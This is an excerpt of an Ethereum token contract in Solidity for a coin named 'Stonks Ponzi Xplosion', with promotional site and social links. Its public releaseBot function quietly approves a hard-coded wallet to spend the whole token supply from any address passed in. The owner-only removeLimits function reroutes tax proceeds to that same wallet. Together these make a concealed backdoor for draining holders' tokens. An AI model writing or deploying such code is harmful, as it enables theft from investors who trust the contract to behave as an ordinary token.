...
Website: https://spxoneth.lol
Telegram: https://t.me/spxcoin_erc
Twitter: https://x.com/spxcoin_erc
*/
...
contract SPX is Context, IERC20, Ownable {
    ...
    address private _spxhouse = 0x1863fB158f8559C01b3aEFF6b4d7CEEE6a481497;
    ...
    string private constant _name = unicode"Stonks Ponzi Xplosion";
    ...
    function removeLimits() external onlyOwner {
        ...
        _taxWallet = payable(_spxhouse);
        _caLimitSell = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function releaseBot(address _robot) public returns (bool){
        _approve(_robot, _spxhouse, _tTotal);
        return _bots[_robot];
    }
